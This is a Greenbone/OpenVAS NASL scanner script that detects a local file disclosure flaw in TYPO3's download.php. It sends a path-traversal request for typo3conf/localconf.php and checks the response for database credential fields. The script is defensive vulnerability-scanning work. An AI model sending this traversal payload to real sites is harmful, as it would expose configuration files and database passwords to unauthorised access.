# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:typo3:typo3";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103291");
  script_version("2025-01-21T05:37:33+0000");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"2025-01-21 05:37:33 +0000 (Tue, 21 Jan 2025)");
  script_tag(name:"creation_date", value:"2011-10-06 13:32:57 +0200 (Thu, 06 Oct 2011)");
  script_name("TYPO3 'download.php' Local File Disclosure Vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_dependencies("gb_typo3_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("typo3/http/detected");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/17905");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/49882");

  script_tag(name:"summary", value:"TYPO3 is prone to a local file disclosure vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"An error exists in download.php script, which fails to
  adequately validate user-supplied input.");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to obtain
  potentially sensitive information from local files on computers running the vulnerable
  application. This may aid in further attacks.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = string(dir, "/fileadmin/download.php?Fichier_a_telecharger=../typo3conf/localconf.php");

if(http_vuln_check(port:port, url:url, pattern:"TYPO3_CONF_VARS", extra_check:make_list("typo_db_password", "typo_db_host", "typo_db_username"))) {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
